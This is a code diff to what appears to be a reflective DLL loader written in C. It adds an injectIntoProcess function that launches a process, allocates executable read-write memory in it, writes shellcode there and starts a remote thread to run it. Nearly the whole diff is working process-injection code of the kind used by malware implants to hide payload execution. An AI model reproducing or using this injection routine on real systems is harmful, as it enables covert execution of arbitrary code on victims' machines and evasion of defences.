@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <stdbool.h>
 #include "../include/addresshunter.h"
+#include "../include/exec.h"
 
 typedef int(WINAPI *MESSAGEBOXA)(HWND, LPCTSTR, LPCTSTR, UINT32);
 typedef int(WINAPI *PRINTF)(char *format, ...);
@@ -370,6 +371,63 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
     #endif
 
     return pEntryPoint;
+}
+
+VOID injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplicationName)
+{
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory( &si, sizeof(si) );
+    si.cb = sizeof(si);
+    ZeroMemory( &pi, sizeof(pi) );
+
+    BOOL success = CreateProcessA
+    (
+        lpApplicationName,                      // lpApplicationName
+        NULL,                                   // lpCommandLine
+        NULL,                                   // lpProcessAttributes
+        NULL,                                   // lpThreadAttributes
+        TRUE,                                   // bInheritHandles
+        INHERIT_PARENT_AFFINITY,                // dwCreationFlags
+        NULL,                                   // lpEnvironment
+        NULL,                                   // lpCurrentDirectory
+        &si,                                    // lpStartupInfo
+        &pi                                     // lpProcessInformation
+    );
+
+    if (!success)
+    {
+        #ifdef DEBUG
+        MessageBoxA(0, "injectIntoProcess: Process creation failed", "Fail", 0x0L);
+        #endif
+        return;
+    }
+
+    LPVOID lpInjectedShellcode = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, dwShellcodeSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (lpInjectedShellcode == NULL)
+    {
+        #ifdef DEBUG
+        MessageBoxA(0, "injectIntoProcess: Memory allocation failed", "Fail", 0x0L);
+        #endif
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return;
+    }
+
+    SIZE_T bytesWritten;
+    WriteProcessMemory(pi.hProcess, lpInjectedShellcode, shellcode, dwShellcodeSize, &bytesWritten);
+    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpInjectedShellcode, NULL, 0, NULL);
+
+    if (hThread == NULL)
+    {
+        #ifdef DEBUG
+        MessageBoxA(0, "injectIntoProcess: Thread creation failed", "Fail", 0x0L);
+        #endif
+    }
+
+    WaitForSingleObject( pi.hProcess, INFINITE );
+    CloseHandle( pi.hProcess );
+    CloseHandle( pi.hThread );
 }
 
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
